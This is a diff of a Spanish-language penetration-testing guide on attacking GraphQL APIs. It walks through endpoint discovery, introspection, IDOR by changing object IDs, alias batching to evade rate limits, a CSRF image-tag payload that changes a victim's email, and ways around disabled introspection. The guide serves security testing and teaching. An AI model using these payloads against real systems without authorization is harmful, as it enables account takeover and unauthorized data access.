@@ -1,217 +1,251 @@
 # 🧖‍♂️ Real World Payloads
 
+## Ataques a APIs GraphQL: Guía Práctica para Entornos Reales
 
+### **Descubriendo Endpoints de GraphQL**
 
-Encontrar Endpoints de GraphQL
+Antes de comenzar a atacar una API GraphQL, lo primero es identificar su endpoint. Los endpoints de GraphQL suelen ser únicos y reutilizables para todas las consultas y mutaciones, lo que los hace un objetivo clave.
 
-#### Identificación Básica de Endpoints
+#### **1. Métodos para Identificar Endpoints**
 
-1. **Endpoints Comunes:**
-   * `/graphql`
-   * `/api`
-   * `/api/graphql`
-   * `/graphql/api`
-   * `/graphql/graphql`
-2.  **Método de Prueba:** Envía la consulta universal a cada endpoint:
+**Nombres Comunes de Endpoints**
 
-    ```json
-    {
-        "query": "{__typename}"
-    }
-    ```
+Prueba con rutas comunes donde suelen encontrarse los endpoints de GraphQL:
 
-**Respuesta esperada**
+* `/graphql`
+* `/api`
+* `/api/graphql`
+* `/graphql/api`
+* `/graphql/graphql`
+* Agrega `/v1`, `/v2` para probar versiones.
+
+**Consultas Universales**
+
+Envíe la siguiente consulta universal para verificar si una URL es un endpoint de GraphQL:
 
 ```json
 {
-    "data": {
-        "__typename": "query"
-    }
+  "query": "{__typename}"
 }
 ```
+
+**Respuesta esperada:**
+
+```json
+{
+  "data": {
+    "__typename": "Query"
+  }
+}
+```
+
+Esto indica que la URL pertenece a un servicio GraphQL.
+
+**Errores Comunes Indicativos**
+
+Busca mensajes como `"query not present"` o `"Bad Request"` al enviar solicitudes mal formadas. Estos mensajes sugieren que el endpoint podría ser un GraphQL mal configurado.
+
+#### **2. Métodos HTTP**
+
+* **POST con `Content-Type: application/json`**: El más común.
+* **GET**: Aunque menos seguro, algunos endpoints lo permiten.
+* **POST con `x-www-form-urlencoded`**: Usado en configuraciones inseguras.
+
+#### **Ejemplo Práctico**
+
+1. Envíe una solicitud a `/graphql/v1`:
+
+```json
+{
+  "query": "{__typename}"
+}
+```
+
+2. Si responde con un error como `"Method Not Allowed"`, cambie el método a `POST` y agregue el encabezado:
+
+```
+Content-Type: application/json
+```
+
+3. Use herramientas como Burp Suite para automatizar pruebas y guardar respuestas.
 
 ***
 
-#### Métodos de Solicitud Alternativos
+### **Introspección en GraphQL**
 
-1.  **POST con `application/json` (Recomendado):**
+La introspección permite consultar el esquema completo de una API GraphQL, revelando detalles sobre consultas, mutaciones y tipos.
 
-    ```http
-    POST /graphql HTTP/1.1
-    Host: target.com
-    Content-Type: application/json
+#### **1. Consultas de Introspección**
 
-    {
-        "query": "{__typename}"
-    }
-    ```
-2.  **GET:** Algunos endpoints pueden aceptar consultas por `GET`.
-
-    ```http
-    GET /graphql?query={__typename} HTTP/1.1
-    Host: target.com
-    ```
-
-***
-
-### Explotación de Argumentos No Saneados
-
-#### Ejemplo: Consulta de Productos
-
-**Consulta Inicial**
-
-```json
-query {
-    products {
-        id
-        name
-        listed
-    }
-}
-```
-
-**Respuesta**
+**Consulta Básica**
 
 ```json
 {
-    "data": {
-        "products": [
-            { "id": 1, "name": "Producto 1", "listed": true },
-            { "id": 2, "name": "Producto 2", "listed": true }
-        ]
-    }
+  "query": "{__schema { queryType { name } }}"
 }
 ```
 
-**Exploit: IDOR para Productos Ocultos**
-
-```json
-query {
-    product(id: 3) {
-        id
-        name
-        listed
-    }
-}
-```
-
-**Respuesta Esperada**
-
-```json
-{
-    "data": {
-        "product": {
-            "id": 3,
-            "name": "Producto Oculto",
-            "listed": false
-        }
-    }
-}
-```
-
-***
-
-### Uso de Introspección para Descubrir Esquemas
-
-#### Consulta de Introspección Básica
-
-```json
-{
-    "query": "{__schema{queryType{name}}}"
-}
-```
-
-**Respuesta Esperada**
-
-```json
-{
-    "data": {
-        "__schema": {
-            "queryType": {
-                "name": "Query"
-            }
-        }
-    }
-}
-```
-
-***
-
-#### Introspección Completa
+**Consulta Completa**
 
 ```json
 query IntrospectionQuery {
-    __schema {
-        queryType { name }
-        mutationType { name }
-        types {
-            name
-            kind
-            fields {
-                name
-                args { name type { name } }
-            }
-        }
+  __schema {
+    queryType {
+      name
     }
+    mutationType {
+      name
+    }
+    subscriptionType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+
+fragment FullType on __Type {
+  name
+  fields(includeDeprecated: true) {
+    name
+    type {
+      name
+    }
+  }
 }
 ```
 
-**Resultado**
+#### **2. Visualización del Esquema**
 
-Detalla el esquema completo, incluidas las consultas, mutaciones y tipos.
+Utiliza herramientas como [GraphQL Voyager](https://apis.guru/graphql-voyager/) para convertir las respuestas JSON en representaciones gráficas interactivas.
 
 ***
 
-### Alias para Evitar Límites de Tasa
+### **Explotación de Vulnerabilidades en GraphQL**
 
-#### Ejemplo de Consulta con Alias
+#### **1. Ataques IDOR (Referencias a Objetos Directos Inseguras)**
 
-```json
+**Escenario**
+
+Supongamos que una API permite consultar productos mediante una ID:
+
+**Consulta Válida:**
+
+```graphql
 query {
-    user1: user(id: 1) { name }
-    user2: user(id: 2) { name }
-    user3: user(id: 3) { name }
+  product(id: 1) {
+    name
+    price
+  }
 }
 ```
 
-**Respuesta**
+**Respuesta:**
 
 ```json
 {
-    "data": {
-        "user1": { "name": "Alice" },
-        "user2": { "name": "Bob" },
-        "user3": { "name": "Charlie" }
+  "data": {
+    "product": {
+      "name": "Producto 1",
+      "price": 100
     }
+  }
 }
 ```
+
+Modifique la ID para acceder a recursos no autorizados:
+
+```graphql
+query {
+  product(id: 999) {
+    name
+    price
+  }
+}
+```
+
+#### **2. Alias para Evadir Límites de Tasa**
+
+Los alias permiten realizar múltiples consultas en una sola solicitud, evadiendo limitadores de solicitudes HTTP:
+
+```graphql
+query {
+  user1: user(id: 1) { name }
+  user2: user(id: 2) { name }
+  user3: user(id: 3) { name }
+}
+```
+
+**Impacto:**
+
+* Realiza ataques de fuerza bruta contra IDs de usuarios o códigos promocionales.
 
 ***
 
-### CSRF en GraphQL
+### **Cross-Site Request Forgery (CSRF) en GraphQL**
 
-#### Ejemplo de Consulta Maliciosa
+Cuando los endpoints de GraphQL no implementan protecciones adecuadas, son susceptibles a ataques CSRF.
 
-```json
+#### **Ejemplo**
+
+Un atacante crea una consulta para cambiar el correo electrónico del usuario:
+
+```graphql
 mutation {
-    updateEmail(email: "attacker@example.com") {
-        success
-    }
+  updateEmail(email: "attacker@example.com") {
+    success
+  }
 }
 ```
 
-#### Ejemplo de Carga Maliciosa
+**Carga Maliciosa**
+
+El atacante inserta esta consulta en un sitio malicioso:
 
 ```html
-<img src="https://target.com/graphql?query=mutation%7BupdateEmail(email%3A%22attacker@example.com%22)%7D">
+<img src="https://victima.com/graphql?query=mutation%7BupdateEmail(email%3A%22attacker%40example.com%22)%7Bsuccess%7D%7D" />
 ```
+
+#### **Mitigaciones**
+
+1. Exigir tokens CSRF únicos.
+2. Validar encabezados `Origin` y `Referer`.
+3. Configurar cookies con `SameSite=Strict`.
 
 ***
 
-### Mitigaciones
+### **Evadiendo Defensas de Introspección**
 
-1. **Deshabilitar Introspección en Producción.**
-2. **Validar los Argumentos de Consultas.**
-3. **Tokens CSRF y Validación de Origen.**
-4. **Limitar Operaciones por Solicitud.**
-5. **Configuración de CORS Estricta.**
+Si la introspección está deshabilitada, prueba las siguientes técnicas:
+
+1. **Manipulación de `__schema`**
+
+Agrega caracteres especiales:
+
+```graphql
+{
+  query { __schema { queryType { name } }}
+}
+```
+
+2. **Métodos HTTP Alternativos**
+
+*   Solicitudes `GET`:
+
+    ```http
+    GET /graphql?query=query%7B__schema%7BqueryType%7Bname%7D%7D
+    ```
+* Cambiar el tipo de contenido a `text/plain` o `application/x-www-form-urlencoded`.
+
+***
+
+### **Conclusión**
+
+La explotación de APIs GraphQL requiere un enfoque creativo y persistente, aprovechando configuraciones incorrectas y vulnerabilidades comunes. Con herramientas como Burp Suite y técnicas avanzadas de evasión, puedes identificar y explotar fallos en entornos reales.
